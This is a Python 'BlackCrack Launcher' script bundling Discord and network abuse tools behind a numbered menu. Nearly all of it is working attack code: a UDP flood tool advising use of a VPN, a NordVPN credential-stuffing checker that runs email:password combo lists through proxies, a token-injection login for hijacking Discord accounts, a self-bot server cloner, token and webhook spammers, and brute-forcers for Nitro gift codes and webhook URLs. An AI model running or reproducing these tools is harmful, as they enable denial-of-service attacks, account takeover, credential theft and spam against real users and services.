import ctypes
import string
import os
import requests
import logging
import json
import asyncio
import httpx
import sys
import os
import time
import socket
import random
from datetime import datetime
import threading
import discord
import tkinter as tk
from tkinter import filedialog
import colorama
from colorama import Back, Fore, Style, init
import time
import random, discord_webhook, fade
from discord_webhook import DiscordWebhook, DiscordEmbed
import sys, time
from sys import stdout
import ipaddress
import re
import socket
import datetime

from pip._internal import commands
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from pypresence import Presence



rpc = Presence("1028307148867911731")
rpc.connect()
rpc.update(state="Using BlackLauncher",details="BlackCrackOnTop!", large_image="blackcrack", buttons=[{"label": "Discord","url":"https://discord.gg/V7JetCEKF7"}])

os.system("color b")
os.system('title BlackCrackLauncher v 0.1.1  by godclicks#5105 BIgBadApache#1723')

print("  ____  _            _     _____                _    ")
print(" |  _ \| |          | |   / ____|              | |   ")
print(" | |_) | | __ _  ___| | _| |     _ __ __ _  ___| | __")
print(" |  _ <| |/ _` |/ __| |/ / |    | '__/ _` |/ __| |/ /")
print(" | |_) | | (_| | (__|   <| |____| | | (_| | (__|   < ")
print(" |____/|_|\__,_|\___|_|\_\\_____|_|  \__,_|\___|_|\_\ ")
print("")
print("")
print("BlackCrack Launcher")
print("")
print("")
print("1. NitroGenerator             |      5. DcToken Login        |       9. Token Spammer")
print("                              |                              |")
print("2. PscGenerator               |      6. Discord Cloner       |       10. Webhook Spotter")
print("                              |                              |")
print("3. DDos-Tool                  |      7. Port Scanner         |       11. Webhook Spammer")
print("                              |                              |")
print("4. Pinger                     |      8. Nordvpn Generator    |       ")
print("                              |                              |")






nitro = 1
psc = 2
ddos = 3
pingfr = 4
tlogin = 5
dcloner = 6
pscan = 7
nordgen = 8
tspammer = 9
wspotter = 10
wspammer = 11

Black = int(input("/:"))

if Black == 1:
    os.system("cls")
    LICNESE = """
    made by godclicks#0001 pls do not steal ;)
    """

    USE_WEBHOOK = True

    print(LICNESE)

    time.sleep(3)
    os.system('cls' if os.name == 'nt' else 'clear')

    try:
        from discord_webhook import DiscordWebhook
    except ImportError:
        input(
            f"Module discord_webhook not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install discord_webhook'\nYou can ignore this error if you aren't going to use a webhook.\nPress enter to continue.")
        USE_WEBHOOK = False
    try:
        import requests
    except ImportError:
        input(
            f"Module requests not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install requests'\nPress enter to exit")
        exit()
    try:
        import numpy
    except ImportError:
        input(
            f"Module numpy not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install numpy'\nPress enter to exit")
        exit()

    url = "https://github.com"
    try:
        response = requests.get(url)
        print("Internet check")
        time.sleep(.4)
    except requests.exceptions.ConnectionError:
        input("You are not connected to internet, check your connection and try again.\nPress enter to exit")
        exit()


    class NitroGen:
        def __init__(self):
            self.fileName = "Nitro Codes.txt"

        def main(self):
            os.system('cls' if os.name == 'nt' else 'clear')
            if os.name == "nt":
                print("")
                ctypes.windll.kernel32.SetConsoleTitleW(
                    "Discord Nitro checker made by godclicks")
            else:
                print(f'\33]0; nitro gen and checker - Made by Godclicks <3\a',
                      end='', flush=True)

            print(""" 
                        _   _ _ _              _____            
                       | \ | (_) |            / ____|           
                       |  \| |_| |_ _ __ ___ | |  __  ___ _ __  
                       | . ` | | __| '__/ _ \| | |_ |/ _ \ '_ \ 
                       | |\  | | |_| | | (_) | |__| |  __/ | | |
                       |_| \_|_|\__|_|  \___/ \_____|\___|_| |_|


                                                            """)
            time.sleep(2)
            self.slowType("Made by: godclicks", .02)
            time.sleep(1)
            self.slowType(
                "\nInput Wie viel willst du überprüfen und generieren? : ", .02, newLine=False)

            try:
                num = int(input(''))
            except ValueError:
                input("Specified input wasn't a number.\nPress enter to exit")
                exit()

            if USE_WEBHOOK:
                self.slowType(
                    "Wenn du die Nitro Infos an eine  Discord webhook senden willst ,schicke hier den link rein oder drücke Enter wenn du es nicht willst : ",
                    .02, newLine=False)
                url = input('')
                webhook = url if url != "" else None

                if webhook is not None:
                    DiscordWebhook(
                        url=url,
                        content=f"```Started checking urls\nI will send any valid codes here```"
                    ).execute()

            valid = []
            invalid = 0
            chars = []
            chars[:0] = string.ascii_letters + string.digits

            c = numpy.random.choice(chars, size=[num, 23])
            for s in c:
                try:
                    code = ''.join(x for x in s)
                    url = f"https://discord.gift/{code}"

                    result = self.quickChecker(url, webhook)

                    if result:
                        valid.append(url)
                    else:
                        invalid += 1
                except KeyboardInterrupt:
                    print("\nInterrupted by user")
                    break

                except Exception as e:
                    print(f" Error | {url} ")

                if os.name == "nt":
                    ctypes.windll.kernel32.SetConsoleTitleW(
                        f"Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - godclicks <3")
                    print("")
                else:
                    print(
                        f'\33]0;Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - Made by godclicks\a',
                        end='', flush=True)

            print(f"""
    Results:
     Valid: {len(valid)}
     Invalid: {invalid}
     Valid Codes: {', '.join(valid)}""")
            input("\nDrücke Enter zum Beenden!")
            [input(i) for i in range(0, 0, -1)]

        def slowType(self, text: str, speed: float, newLine=True):
            for i in text:
                print(i, end="", flush=True)
                time.sleep(speed)
            if newLine:
                print()

        def quickChecker(self, nitro: str, notify=None):
            url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
            response = requests.get(url)

            if response.status_code == 200:
                print(f" Valid | {nitro} ", flush=True,
                      end="" if os.name == 'nt' else "\n")
                with open("Nitro Codes.txt", "w") as file:
                    file.write(nitro)

                if notify is not None:
                    DiscordWebhook(
                        url=url,
                        content=f"Valid Nito Code detected! @everyone \n{nitro}"
                    ).execute()

                return True
            else:
                print(f" Invalid | {nitro} ", flush=True,
                      end="" if os.name == 'nt' else "\n")
                return False


    if __name__ == '__main__':
        Gen = NitroGen()
        Gen.main()

elif Black == 2:


    colors_list = ["ff0000", "b164da", "e4cb84"]

    red = colorama.Fore.RED
    blue = colorama.Fore.BLUE
    white = colorama.Fore.WHITE
    green = colorama.Fore.GREEN
    reset = colorama.Fore.RESET

    os.system("@mode con cols=80 lines=20")

    banner = """
         _____   _____  _____    _____            
        |  __ \ / ____|/ ____|  / ____|           
        | |__) | (___ | |      | |  __  ___ _ __  
        |  ___/ \___ \| |      | | |_ |/ _ \ '_ \ 
        | |     ____) | |____  | |__| |  __/ | | |
        |_|    |_____/ \_____|  \_____|\___|_| |_|



    """
    banner = fade.pinkred(banner)

    os.system("cls")
    print(banner)
    input_webhook = input(f"[{green}+{reset}] Webhook URL: ")


    def main():
        while True:
            code = random.randint(1000000000000000, 9999999999999999)
            os.system("cls")
            print(banner)
            print(f"                     [{green}+{reset}] New Code: {blue}{code}{reset}")
            time.sleep(0.5)
            webhook = DiscordWebhook(url=input_webhook)
            embed = DiscordEmbed(title='PSC Generator', description=f"`➕` Code: {code}",
                                 color=random.choice(colors_list))
            webhook.add_embed(embed)
            time.sleep(0.5)
            response = webhook.execute()


    main()


elif Black == 3:
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year

    ##############
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    #############
    os.system("cls")
    print("Note: DON'T USE IT WITHOUT A VPN/PROXY")
    ip = str(input("IP Target : "))
    port = int(input("Port       : "))

    print("[                    ] 0% ")
    time.sleep(2)
    print("[=====               ] 25%")
    time.sleep(5)
    print("[==========          ] 50%")
    time.sleep(4)
    print("[===============     ] 75%")
    time.sleep(1)
    print("[====================] 100%")
    time.sleep(3)
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 0
        print("Sent %s packet to %s throught port:%s"%(sent, ip, port))
        if port == 65534:
            port = 1

elif Black == 4:
    def ipping():
        os.system("cls")
        count = 1
        e = input("Enter IP Address:   ")
        replies = 0
        replies += 1
        hostname = e
        os.system("cls")
        print("-" * 100)
        print("=" * 100)
        print("-" * 100)
        while True:
            response = os.system(
                "ping -n 1 " + hostname + " [insert angled bracket here because youtube description won't let me]nul")
            if response == 0:
                print("\033[1;32;40m" + hostname + " is online!" + " [" + str(count) + "]" + '\033[0m')
            else:
                print("\033[31m" + hostname + " is offline!" " [" + str(count) + "]" + '\033[0m')
            count += 1
            time.sleep(2)


    ipping()

elif Black == 5:
    os.system("cls")
    print("""
      _______    _              _                 _       
     |__   __|  | |            | |               (_)      
        | | ___ | | _____ _ __ | |     ___   __ _ _ _ __  
        | |/ _ \| |/ / _ \ '_ \| |    / _ \ / _` | | '_ \ 
        | | (_) |   <  __/ | | | |___| (_) | (_| | | | | |
        |_|\___/|_|\_\___|_| |_|______\___/ \__, |_|_| |_|
                                             __/ |        
                                            |___/         
    """)

    token = input('Token: ')
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    driver = webdriver.Chrome('chromedriver.exe')
    driver.get('https://discord.com/login')
    js = 'function login(token) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`}, 50);setTimeout(() => {location.reload();}, 500);}'
    time.sleep(3)
    driver.execute_script(js + f'login("{token}")')

elif Black == 6:
    init()
    os.system("cls")

    token = input('{}\n[>] {} TOKEN: {}'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET))
    prefix = input('{}\n[>] {} PREFIX: {}'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET))
    client = commands.Bot(command_prefix=prefix, case_insensitive=True,
                          self_bot=True)

    client.remove_command('help')
    header = {"Authorization": f'Bot {token}'}
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system('cls' if os.name == 'nt' else 'clear')

    intents = discord.Intents.all()
    intents.members = True


    @client.event
    async def on_ready():
        print('------')
        print('{}\n[>] {} Selfbot running... {}'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET))
        print('{}\n[>] {} Command:{} {}copyserver\n'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET, prefix))
        print('     - Logged in as ' + client.user.name)
        print('     - User ID: ' + str(client.user.id))
        print('\n------\n')


    @client.command()
    async def copyserver(ctx):
        await ctx.message.delete()
        wow = await client.create_guild(f'backup-{ctx.guild.name}')
        await asyncio.sleep(4)
        for g in client.guilds:
            if f'backup-{ctx.guild.name}' in g.name:
                for c in g.channels:
                    await c.delete()
                for cate in ctx.guild.categories:
                    x = await g.create_category(f"{cate.name}")
                    for chann in cate.channels:
                        if isinstance(chann, discord.VoiceChannel):
                            await x.create_voice_channel(f"{chann}")
                        if isinstance(chann, discord.TextChannel):
                            await x.create_text_channel(f"{chann}")
                print(ctx.guild.roles)
        for role in ctx.guild.roles[::-1]:
            if role.name != "@everyone":
                try:
                    await wow.create_role(name=role.name, color=role.color, permissions=role.permissions,
                                          hoist=role.hoist, mentionable=role.mentionable)
                    print(f"Created new role : {role.name}")
                except:
                    break


    client.run(token, bot=False)

elif Black == 7:
    # Regular Expression Pattern to extract the number of ports you want to scan.
    # You have to specify <lowest_port_number>-<highest_port_number> (ex 10-100)
    port_range_pattern = re.compile("([0-9]+)-([0-9]+)")
    # Initialising the port numbers, will be using the variables later on.
    port_min = 0
    port_max = 65535

    # This script uses the socket api to see if you can connect to a port on a specified ip address.
    # Once you've successfully connected a port is seen as open.
    # This script does not discriminate the difference between filtered and closed ports.

    # Basic user interface header
    print("Scan Ports")
    os.system("cls")
    open_ports = []
    while True:
        ip_add_entered = input("\nPlease enter the ip address that you want to scan: ")
        try:
            ip_address_obj = ipaddress.ip_address(ip_add_entered)
            print("You entered a valid ip address.")
            break
        except:
            print("You entered an invalid ip address")

    while True:
        print("Please enter the range of ports you want to scan in format: <int>-<int> (ex would be 60-120)")
        port_range = input("Enter port range: ")
        port_range_valid = port_range_pattern.search(port_range.replace(" ", ""))
        if port_range_valid:
            port_min = int(port_range_valid.group(1))
            port_max = int(port_range_valid.group(2))
            break

    for port in range(port_min, port_max + 1):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                s.connect((ip_add_entered, port))
                open_ports.append(port)

        except:
            print("No Ports where open there...")
            pass

    for port in open_ports:
        # We use an f string to easily format the string with variables so we don't have to do concatenation.
        print(f"Port {port} is open on {ip_add_entered}.")


elif Black == 8:
    init(convert=True)

    lock = threading.Lock()


    def free_print(arg):
        lock.acquire()
        stdout.flush()
        print(arg)
        lock.release()


    class NordVPN:
        def __init__(self):
            self.data = {
                'use_proxy': False,
                'proxy_type': None,
                'proxy_dir': None,
                'combo_dir': None,
                'checked': 0,
                'retries': 0,
                'cpm': 0,
            }

            self.custom = ''
            root = tk.Tk()
            root.withdraw()

        def __read(self, filename, method):
            output = []
            with open(filename, method, encoding='UTF-8') as file:
                lines = file.readlines()
                for l in lines:
                    output.append(l.replace('\n', ''))

            return output

        def __make_copy(self):
            with open('data/temp_combo.txt', 'w', encoding='UTF-8') as file:
                accounts = self.__get_accounts()
                for x in accounts:
                    file.write(x + '\n')

        def __get_accounts(self):
            account_list = self.__read(self.data['combo_dir'], 'r')
            return account_list

        def __get_proxy(self, proxy_type, direct):
            proxy_list = self.__read(self.data['proxy_dir'], 'r')
            proxies = {'http': '%s://%s' % (self.data['proxy_type'], random.choice(proxy_list))}

            return proxies

        def custom_message(self, arg):
            self.custom = arg

        def cpm_counter(self):
            while True:
                previous = self.data['checked']
                time.sleep(4)
                after = self.data['checked']
                self.data['cpm'] = (after - previous) * 15

        def update_title(self):
            while True:
                elapsed = time.strftime('%H:%M:%S', time.gmtime(time.time() - self.start))
                os.system(
                    'title NordVPN Checker - Checked: %s ^| Retries: %s ^| CPM: %s ^| Time Elapsed: %s ^| Threads: %s' % (
                    self.data['checked'], self.data['retries'], self.data['cpm'], elapsed,
                    (threading.active_count() - 2)))
                time.sleep(0.4)

        def title(self):
            print(f'''{Fore.CYAN}

        \t\t\t\t __      _______  _   _  _____            
        \t\t\t\t \ \    / /  __ \| \ | |/ ____|           
        \t\t\t\t  \ \  / /| |__) |  \| | |  __  ___ _ __  
        \t\t\t\t   \ \/ / |  ___/| . ` | | |_ |/ _ \ '_ \ 
        \t\t\t\t    \  /  | |    | |\  | |__| |  __/ | | 
        \t\t\t\t     \/   |_|    |_| \_|\_____|\___|_| |_|
        \t\t\t\t                                          

                {Style.RESET_ALL}''')

        def user_proxy(self):
            self.data['use_proxy'] = True

            print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Please choose choose proxy text file. ')

            proxy_dir = filedialog.askopenfilename()
            self.data['proxy_dir'] = proxy_dir

            try:
                proxy_type = int(input(
                    f'[{Fore.CYAN}?{Style.RESET_ALL}] HTTPS[{Fore.CYAN}0{Style.RESET_ALL}]/SOCKS4[{Fore.CYAN}1{Style.RESET_ALL}]/SOCKS5[{Fore.CYAN}2{Style.RESET_ALL}] > '))

            except ValueError:
                print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Value error! Please choose 0, 1, or 2!')
                time.sleep(3)
                self.user_proxy()

            if proxy_type == 0:
                self.data['proxy_type'] = 'https'

            elif proxy_type == 1:
                self.data['proxy_type'] = 'socks4'

            elif proxy_type == 2:
                self.data['proxy_type'] = 'socks5'

            else:
                print(f'[{Fore.CYAN}!{Style.RESET_ALL}] Please choose a valid int such as 0, 1, or 2!')
                time.sleep(3)
                self.user_proxy()

        def user_combo(self):
            combo_dir = filedialog.askopenfilename()
            self.data['combo_dir'] = combo_dir

            self.__make_copy()

        def get_accounts(self):
            account_list = self.__read('data/temp_combo.txt', 'r')
            return account_list

        def get_data(self):
            return self.data

        def checker(self, email, password):
            url = 'https://api.nordvpn.com/v1/users/tokens'
            data = {'username': email, 'password': password}

            if self.data['use_proxy']:
                proxies = self.__get_proxy(self.data['proxy_type'], self.data['proxy_dir'])

                try:

                    r = requests.post(url, json=data, proxies=proxies)

                    if 'Unauthorized' in r.text:
                        free_print(f'[*] {Fore.RED}BAD{Style.RESET_ALL} | {email}:{password}')
                        with open('output/bad.txt', 'a', encoding='UTF-8') as f: f.write('%s:%s\n' % (email, password))

                    if 'user_id' in r.text:
                        expiry = r.json()['expires_at']
                        free_print(f'[*] {Fore.CYAN}HIT{Style.RESET_ALL} | {email}:{password} | expires_at : {expiry}')
                        with open('output/raw_hits.txt', 'a', encoding='UTF-8') as f: f.write(
                            '%s:%s\n' % (email, password))
                        with open('output/hits.txt', 'a', encoding='UTF-8') as f: f.write(
                            '%s:%s | Expiry Date: %s %s\n' % (email, password, expiry, self.custom))

                    if 'Too Many Requests' in r.text:
                        free_print(
                            f'[!] {Fore.RED}ERROR, TOO MANY REQUESTS. Change your proxies or use a different VPN. {Style.RESET_ALL}')

                    self.data['checked'] += 1
                except requests.exceptions.RequestException:  # all requests related errors
                    self.data['retries'] += 1
                    self.checker(email, password)

            else:
                try:
                    r = requests.post(url, json=data)

                    if 'Unauthorized' in r.text:
                        free_print(f'[*] {Fore.RED}BAD{Style.RESET_ALL} | {email}:{password} ')
                        with open('output/bad.txt', 'a', encoding='UTF-8') as f: f.write('%s:%s\n' % (email, password))

                    if 'user_id' in r.text:
                        expiry = r.json()['expires_at']
                        free_print(f'[*] {Fore.CYAN}HIT{Style.RESET_ALL} | {email}:{password} | expires_at : {expiry}')
                        with open('output/raw_hits.txt', 'a', encoding='UTF-8') as f: f.write(
                            '%s:%s\n' % (email, password))
                        with open('output/hits.txt', 'a', encoding='UTF-8') as f: f.write(
                            '%s:%s | Expiry Date: %s %s\n' % (email, password, expiry, self.custom))

                    if 'Too Many Requests' in r.text:
                        free_print(
                            f'[!] {Fore.RED}ERROR, TOO MANY REQUESTS. Change your proxies or use a different VPN. {Style.RESET_ALL}')

                    self.data['checked'] += 1
                except requests.exceptions.RequestException:
                    self.data['retries'] += 1
                    self.checker(email, password)

        def multi_threading(self):
            self.start = time.time()
            threading.Thread(target=self.cpm_counter, daemon=True).start()
            threading.Thread(target=self.update_title, daemon=True).start()


    check = None


    def worker(n, combos, thread_id):
        global check

        while check[thread_id] < len(combos):
            combination = combos[check[thread_id]].split(':')
            n.checker(combination[0], combination[1])
            check[thread_id] += 1


    def main():
        global check
        os.system('cls')

        n = NordVPN()
        n.title()
        print('\n\n')

        use_message = input(f'[{Fore.CYAN}>{Style.RESET_ALL}] Add custom message after hit? y/n  > ')

        if use_message == 'y':
            print(f'[{Fore.CYAN}>{Style.RESET_ALL}] This message will be added to the text file if it is a hit.')
            custom_message = input(f'[{Fore.CYAN}>{Style.RESET_ALL}] Add: ')
            n.custom_message(custom_message)

        use_proxy = input(f'[{Fore.CYAN}>{Style.RESET_ALL}] Use proxy? y/n > ')

        if use_proxy == 'y':
            n.user_proxy()

        print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Please choose combo list text file. (email:pass)')

        n.user_combo()  # get file directory

        combos = n.get_accounts()  # combo in list

        thread_count = int(input(f'[{Fore.CYAN}>{Style.RESET_ALL}] Enter number of threads > '))

        n.multi_threading()

        os.system('cls')
        n.title()
        print('\n\n')

        threads = []

        check = [0 for i in range(thread_count)]

        for i in range(thread_count):
            sliced_combo = combos[int(len(combos) / thread_count * i): int(len(combos) / thread_count * (i + 1))]
            t = threading.Thread(target=worker, args=(n, sliced_combo, i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print('[!] Task completed.')

        os.system('pause>nul')


    if __name__ == '__main__':
        main()

elif Black == 9:
    import sys, time
    def print015(text):
        for c in text:
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(0.015)
        sys.stdout.write("\n")


    def print01(text):
        for c in text:
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(0.015)


    try:
        import colorama, requests
    except:
        sys.stdout.write("> ")
        print015("Missing Required Modules, Press Enter To Download (May Not Always Work)")
        input("")
        try:
            import os

            os.system("pip install colorama requests")
        except:
            pass
        sys.stdout.write("> ")
        print015("Problem Maybe Fixed Now, Restart The Program")
        input("")
        exit()

    colorama.init(autoreset=True)

    import os, threading


    def set_title():
        title = "Discord Token Spammer"
        try:
            import requests
            text = str(requests.get("https://pastebin.com/R3adGJ6h").text)
            os.system(f"title {title}{text}")
        except:
            os.system(f"title {title}")


    threading.Thread(target=set_title).start()

    import threading, time, random


    def single_spammer():
        invite_code = str(requests.get("https://pastebin.com/raw/9SxbfxE8").text)
        while True:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Enter Token: ")
            tokens = input("")
            r1 = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": tokens})
            if "200" not in str(r1):
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015("Invalid Token")
            if "200" in str(r1):
                r = requests.get(f'https://discord.com/api/v6/invite/{invite_code}', headers={"Authorization": tokens})
                if "200" in str(r):
                    break
                if "403" in str(r):
                    sys.stdout.write(colorama.Fore.RED + "> ")
                    print015("Locked Token")

        while True:
            try:
                sys.stdout.write(colorama.Fore.CYAN + "> ")
                print01("Enter Delay (0 For None): ")
                delay = input("")
                delay = float(delay)
                break
            except:
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015("Enter A Valid Choice")
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print01("Enter Msg To Spam: ")
        msg = input("")

        while True:
            try:
                sys.stdout.write(colorama.Fore.CYAN + "> ")
                print01("Enter Channel Id: ")
                channel = int(input(""))
                break
            except:
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015("Enter A Valid Choice")

        while True:
            try:
                sys.stdout.write(colorama.Fore.CYAN + "> ")
                print01("Enter Amount Of Messages To Send: ")
                amount = int(input(""))
                break
            except:
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015("Enter A Valid Choice")
        headers = {
            "authorization": tokens
        }
        json = {
            "content": msg,
            "tts": False
        }
        done = 0
        while True:
            try:
                r = requests.post("https://discord.com/api/v9/channels/" + str(channel) + "/messages", headers=headers,
                                  json=json)
                r = str(r)
                if "200" in r:
                    done = int(done) + 1
                    print(
                        f"{colorama.Fore.CYAN}[{colorama.Fore.RESET}{str(done)}{colorama.Fore.CYAN}/{colorama.Fore.RESET}{str(amount)}{colorama.Fore.CYAN}]{colorama.Fore.RESET} Succsesfully Sent Message In {colorama.Fore.CYAN + str(channel)}")
                else:
                    sys.stdout.write(colorama.Fore.CYAN + "> ")
                    print(f"Unknown Error{colorama.Fore.CYAN}/{colorama.Fore.RESET}Rate Limited")
            except:
                sys.stdout.write(colorama.Fore.CYAN + "> ")
                print("Unknown Error")
            if str(done) == str(amount):
                sys.stdout.write(colorama.Fore.CYAN + "> ")
                print("Done Spamming")
                input("")
                exit()
            time.sleep(float(delay))


    choices = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
               "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p",
               "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9"]

    fail = 0


    def spammer(tokens, channel, msg, delay, proxy, ren):
        global sent, fail
        headers = {
            "authorization": tokens
        }

        while True:
            if ren == "n":
                json = {"content": msg, "tts": False}
            if ren == "y":
                json = {"content": msg + " | " + "".join(random.choices(choices, k=5)), "tts": False}

            try:
                if proxy == "":
                    r = requests.post("https://discord.com/api/v9/channels/" + str(channel) + "/messages",
                                      headers=headers, json=json)
                if proxy != "":
                    r = requests.post("https://discord.com/api/v9/channels/" + str(channel) + "/messages",
                                      headers=headers, json=json, proxies={"http": proxy, "https": proxy})

                r = str(r)
                if "200" in r:
                    sent = int(sent) + 1
                else:
                    fail = int(fail) + 1
            except:
                pass
            time.sleep(float(delay))


    sent = 0

    while True:
        sys.stdout.write(colorama.Fore.CYAN + "1. ")
        print015("Single Token Spammer")
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        tools = input("")
        if tools == "1" or tools == "2":
            break
        else:
            print("Enter A Valid Choice")

    if tools == "1":
        single_spammer()
    if tools == "2":
        os.system("start main.py")

elif Black == 10:
    error = False
    import os, threading
    import sys, time


    def print015(text):
        for c in text:
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(0.015)
        sys.stdout.write("\n")


    def print01(text):
        for c in text:
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(0.015)


    try:
        import colorama, requests
    except:
        sys.stdout.write("> ")
        print015("Missing Required Modules, Press Enter To Download (May Not Always Work)")
        input("")
        try:
            import os

            os.system("pip install colorama requests")
        except:
            pass
        sys.stdout.write("> ")
        print015("Problem Maybe Fixed Now, Restart The Program")
        input("")
        exit()

    webs = []

    import random, time, threading

    colorama.init(autoreset=True)
    choice = "1234567890"
    choices = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
               "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p",
               "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9"]


    def sniper():
        global webs
        while True:
            ide = random.choices(choice, k=18)
            ide = "".join(ide)
            code = random.choices(choices, k=68)
            code = "".join(code)
            webhook = "https://discord.com/api/webhooks/" + str(ide) + "/" + str(code)
            r = requests.get(webhook)
            if "200" in str(r):
                webs.append("Valid Webhook! " + webhook)
                if save == "y":
                    valid = open("valid_webhooks.txt", "a")
                    valid.write(webhook + "\n")
                    valid.close()
            else:
                webs.append("Invalid Webhook! " + webhook)
                if save == "y":
                    invalid = open("invalid_webhooks.txt", "a")
                    invalid.write(webhook + "\n")
                    invalid.close()
            time.sleep(float(delay))


    def valid():
        sys.stdout.write(colorama.Fore.RED + "> ")
        print015("Enter A Valid Choice")
        return


    while True:
        try:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Enter How Many Threads You Want: ")
            threads = input("")
            threads = int(threads)
            break
        except:
            valid()
    while True:
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print01("Wanna Auto Save Webhooks (y/n): ")
        save = input("")
        if save == "y" or save == "n":
            break
        else:
            valid()
    while True:
        try:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Enter Delay For Each Thread (0 = No Delay): ")
            delay = input("")
            delay = float(delay)
            break
        except:
            valid()
    for u in range(int(threads)):
        threading.Thread(target=sniper).start()
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print("Started Thread")

    den = 0

    while True:
        for u in webs:
            webs.remove(u)
            den = int(den) + 1
            if "Invalid" in u:
                sys.stdout.write(colorama.Fore.RED + "> ")
                print(f"Invalid Webhook {colorama.Fore.RED}[{colorama.Fore.RESET}{str(den)}{colorama.Fore.RED}]")

            if "Valid" in u:
                sys.stdout.write(colorama.Fore.CYAN + "> ")
                print(f"Valid Webhook {colorama.Fore.CYAN}[{colorama.Fore.RESET}{str(den)}{colorama.Fore.CYAN}]")

elif Black == 11:
    init(convert=True)
    os.system("cls")
    print("")
    print("Webhook Spammer ")
    print("")
    print("")

    webhook = input(Fore.RED + "Enter the Webhook Url: ")
    msg = input(Fore.CYAN + "Enter the message: ")
    tyme = int(input(Fore.BLUE + "Enter the number of times to spam: "))


    def proxy_spam():
        req = httpx.post(webhook, json={'content': msg}, proxies=proxy)
        if req.status_code == 204:
            print(Fore.GREEN + "Message Sent Successfully")
        else:
            print(Fore.WHITE + "Bad proxies or webhook or ratelimited")


    def proxyless_spam():
        req = httpx.post(webhook, json={'content': msg})
        if req.status_code == 204:
            print(Fore.GREEN + "Message Sent Successfully")
        else:
            print(Fore.WHITE + "Bad proxies or webhook or ratelimited")


    support = input(Fore.LIGHTYELLOW_EX + "tipe 1 to start: ")

    if support == "Y":
        for i in range(tyme):
            proxy_spam()
    elif support == "1":
        for i in range(tyme):
            proxyless_spam()
    else:
        sys.exit()




print("")
print("")
print("")
print("")
input("Enter...")